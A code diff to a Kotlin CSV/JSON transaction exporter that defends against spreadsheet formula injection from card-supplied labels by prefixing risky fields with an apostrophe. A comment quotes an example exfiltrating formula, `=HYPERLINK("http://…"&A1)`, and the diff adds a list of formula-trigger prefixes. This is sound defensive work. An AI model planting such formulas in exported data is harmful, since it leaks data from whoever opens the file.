@@ -115,12 +115,27 @@ class TransactionExporter(private val clock: Clock) {
             """"fingerprint": ${jsonString(card.fingerprint)}}"""
     }
 
-    private fun csvField(value: String): String =
-        if (value.any { it == ',' || it == '"' || it == '\n' || it == '\r' }) {
-            "\"" + value.replace("\"", "\"\"") + "\""
+    /**
+     * Quotes a CSV field, and defuses the spreadsheet formula prefixes first.
+     *
+     * Card-supplied text reaches this function. The application label comes from tag 50 or tag
+     * 9F12, both of which the card chooses, so a hostile card can name itself
+     * `=HYPERLINK("http://…"&A1)` and have that evaluated the moment a merchant opens the export in
+     * Excel, Sheets or LibreOffice. Quoting alone does not help: the formula fires inside a quoted
+     * cell too. Prefixing with an apostrophe is the standard mitigation - the spreadsheet then
+     * treats the cell as literal text and shows the characters as written.
+     *
+     * The amount and count columns are produced here from `Long`s and are never negative, so
+     * guarding `-` costs nothing legitimate.
+     */
+    private fun csvField(value: String): String {
+        val safe = if (value.isNotEmpty() && value[0] in FORMULA_PREFIXES) "'$value" else value
+        return if (safe.any { it == ',' || it == '"' || it == '\n' || it == '\r' }) {
+            "\"" + safe.replace("\"", "\"\"") + "\""
         } else {
-            value
+            safe
         }
+    }
 
     private fun jsonString(value: String?): String {
         if (value == null) return "null"
@@ -137,5 +152,14 @@ class TransactionExporter(private val clock: Clock) {
             }
         }
         return "\"$escaped\""
+    }
+
+    private companion object {
+        /**
+         * A leading one of these starts formula evaluation in Excel, Google Sheets and LibreOffice
+         * Calc. Tab and carriage return are in the list because a leading whitespace character is
+         * skipped by the parser, which puts the next character back at the start of the cell.
+         */
+        const val FORMULA_PREFIXES = "=+-@\t\r"
     }
 }
